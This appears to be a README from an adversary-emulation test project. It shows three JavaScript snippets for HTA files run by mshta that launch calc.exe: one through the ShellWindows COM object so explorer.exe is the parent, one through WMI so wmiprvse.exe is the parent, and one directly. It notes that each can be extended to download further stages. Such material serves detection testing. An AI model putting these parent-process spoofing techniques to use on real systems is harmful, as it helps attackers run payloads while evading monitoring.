# HTA

## AtomicHTA

Three ways to spawn calc using HTA. Each are customizable to download a chain reaction to perform additional behaviors.

## MSHTA - Explorer Spawning CMD

Using COM objects, mshta runs with no child processes. Explorer.exe spawns and executes cmd -> calc.

```
// Type One
// Child of Explorer, cmd.exe
var ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
var SW = GetObject("new:" + ShellWindows).Item();
SW.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", 'C:\\Windows\\System32', null, 0);
```

## MSHTA - Wmiprvse Spawning CMD

Using COM objects, mshta runs with no child processes. Wmiprvse spawns and executes cmd -> calc.

```
// Type Two
// Child of wmiprvse
var strComputer = ".";
var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
var objStartup = objWMIService.Get("Win32_ProcessStartup");
var objConfig = objStartup.SpawnInstance_();
objConfig.ShowWindow = 0;
var objProcess = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2:Win32_Process");
var intProcessID;
objProcess.Create("cmd.exe", null, objConfig, intProcessID);
```
## MSHTA spawning CMD

Mshta spawns child process of calc.exe.

```
// Type Three
// Child of mshta.exe
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
```
